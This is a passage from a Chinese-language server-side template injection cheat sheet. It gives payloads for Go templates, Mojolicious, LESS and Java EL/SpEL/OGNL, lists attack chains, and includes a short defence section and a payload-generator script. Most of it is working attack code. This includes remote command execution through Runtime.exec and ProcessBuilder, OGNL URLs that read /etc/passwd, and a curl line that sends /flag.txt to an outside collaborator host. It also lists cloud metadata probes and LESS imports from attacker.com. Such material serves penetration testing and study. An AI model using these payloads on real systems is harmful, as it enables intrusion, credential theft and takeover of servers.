{{html "ssti"}}             // 输出 "ssti"（非 "htmlssti"）

# XSS (text/template 直接注入，html/template 编码)
{{"<script>alert(1)</script>"}}       // 编码后 → &lt;script&gt;...
{{define "T1"}}alert(1){{end}} {{template "T1"}}  // 绕过编码

# RCE (依赖源码中存在可调用的危险方法)
{{ .System "ls" }}           // 如果对象有 System 方法

// 示例危险方法定义
func (p Person) Secret (test string) string {
    out, _ := exec.Command(test).CombinedOutput()
    return string(out)
}
```

## 8.7 Perl — Mojolicious

```perl
<%= 7*7 %> = 49
<%= perl code %>
<% perl code %>
```

## 8.8 CSS — LESS

LESS 的 `@import` 指令在编译时获取资源：

```less
// SSRF via @import
@import (inline) "http://attacker.com/evil.css";

// 跨协议利用
@import (inline) "file:///etc/passwd";
```

---

# 0x09 EL (Expression Language) / SpEL / OGNL 专项

EL 是 JavaEE 的表达式语言，广泛用于 JSF、JSP、Spring。**它天然支持方法调用**，是 SSTI 的高危子类。

## 9.1 基础操作

```java
# 字符串
{"a".toString()}                    → [a]
{"dfd".replace("d","x")}            → [xfx]

# 反射
{"".getClass()}                     → [class java.lang.String]
{""["class"]}                       → 绕过 getClass
{"".getClass().forName("java.util.Date")}  → [class java.util.Date]

# Burp 检测向量
gk6q${"zkz".toString().replace("k", "x")}doap2  → igk6qzxzdoap2
```

## 9.2 RCE Payload

```java
# 确认 getRuntime 方法
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}  → getRuntime()

# 执行命令
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}

# 绕过 getClass
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

# HTML 实体注入
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

# ProcessBuilder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}

# ScriptEngineManager 一行
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

# SpEL 字符绕过
T(java.lang.Runtime).getRuntime().exec('cmd /c dir')
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
```

## 9.3 信息侦察

```java
# 环境变量
${sessionScope.toString()}
${pageContext.request.getSession().setAttribute("admin", true)}  # 授权绕过

# 自定义变量
${user}
${password}
${employee.FirstName}
```

## 9.4 远程文件包含

```
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=/etc/passwd
```

## 9.5 OGNL RCE (Linux)

```
https://example.com/?p=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```

---

# 0x0A 攻击链与联动

## 链 1：SSTI → RCE → 内网穿透

```
用户输入点 → SSTI (exec) → 反弹 Shell → 内网横向移动
```

## 链 2：SSTI → 文件读取 → 凭据窃取

```
SSTI read → /etc/passwd / application.properties → 数据库密码 → 数据泄露
```

## 链 3：SSTI → SSRF → 云 Metadata

```
SSTI exec "curl 169.254.169.254" → AWS/GCP Metadata → 云账号接管
```

## 链 4：CSTI + SSTI 混合

```
CSTI (客户端 Angular/Vue 注入) → 操纵 DOM → 触发 SSTI 接口 → RCE
```

## 链 5：LESS @import → SSRF → 内网探测

```
CSS 注入 → @import (inline) "http://internal/" → 内网端口扫描
```

---

# 0x0B 检测与防御

## 11.1 开发层面

1. **永远将用户数据作为模板变量传递，而非拼入模板字符串**：

```python
# 危险
render_template_string("Hello " + user_input)

# 安全
render_template("hello.html", name=user_input)
```

2. **使用沙箱模式**：如 Jinja2 的 `SandboxedEnvironment`
3. **禁用危险函数/标签**：移除 `exec`、`popen`、`import` 等访问路径
4. **输入验证**：拒绝包含模板语法的用户输入（`{{`、`{%`、`${`、`<%=` 等）
5. **CSP**：虽不能阻止 SSTI，但可限制后续 XSS 利用

## 11.2 检测层面

- **WAF 规则**：检测请求中模板引擎特殊语法
- **RASP**：运行时拦截 `Runtime.exec()`、`ProcessBuilder`、文件读取
- **SAST**：扫描 `render_template_string`、`eval`、`parseExpression` 等危险调用
- **DAST**：主动扫描 SSTI 注入点（TInjA、SSTImap）

## 11.3 应急响应

- 确认受影响模板引擎版本和类型
- 检查是否有沙箱配置
- 审计从注入点到 RCE 的完整利用链
- 确认是否有文件写入权限（Webshell 持久化风险）

---

# 0x0C Fuzzing 字典

## 12.1 关键 Fuzz 列表

- [SecLists — template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt) — 各引擎环境变量字典
- [SecLists — burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) — 参数名 Fuzz 字典
- [Auto_Wordlists — ssti.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt) — SSTI 专用检测字典
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — 全引擎 Payload 参考库

## 12.2 Payload 生成脚本（Spring 字符码绕过）

```python
#!/usr/bin/python3
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd, end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
    if count == 1:
        base_payload += f"(T(java.lang.Character).toString({i}).concat"
        count += 1
    elif count == len(converted):
        base_payload += f"(T(java.lang.Character).toString({i})))"
    else:
        base_payload += f"(T(java.lang.Character).toString({i})).concat"
        count += 1

print(base_payload + end_payload)
```

---

# 0x0D 参考资料

- [PortSwigger — Server-Side Template Injection (Exploiting)](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- [PortSwigger — SSTI Research Paper](https://portswigger.net/research/server-side-template-injection)
- [PayloadsAllTheThings — SSTI (全引擎 Payload 参考)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Template Injection Table — 44 引擎 Polyglot 对照](https://github.com/Hackmanit/template-injection-table)
- [0xAwali — Template Engines Injection 101 (Medium)](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
- [Acunetix — Exploiting SSTI in Thymeleaf](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
- [Cle'ment Notin — SSTI in ASP.NET Razor](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
- [BetterHacker — RCE in HubSpot with EL Injection in HUBL](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [Groovy Template Engine Exploitation Notes](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)
- [AppCheck — Template Injection in JsRender/JsViews](https://appcheck-ng.com/template-injection-jsrender-jsviews/)
- [SSTI in Go's Template Engine](https://www.onsecurity.io/blog/go-ssti-method-research/)
- [OnSecurity — Go SSTI Method Research](https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to)
- [Spring View Manipulation (Veracode Research)](https://github.com/veracode-research/spring-view-manipulation)
- [CVE-2025-24893 — XWiki SolrSearch Groovy RCE (GHSA-rr6p-3pfg-562j)](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j)
- [0xdf — HTB: Editor (XWiki Groovy RCE Walkthrough)](https://0xdf.gitlab.io/2025/12/06/htb-editor.html)
- [DiogoMRSilva — 已知存在 SSTI 的网站列表（测试靶场）](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
- [SSTI Polyglot Fuzz 列表](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
- [BlackHat 2015 — SSTI RCE for the Modern Web App (PDF)](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [Fenjing — Jinja2 WAF Bypass 工具](https://github.com/Marven11/Fenjing)
- [Expression Language Injection — ZhaoHuaXiShi 知识库](./EL%20Expression%20Language.md)
- [Jinja2 SSTI Deep Dive — ZhaoHuaXiShi 知识库](./Jinja2%20Deep%20Dive.md)
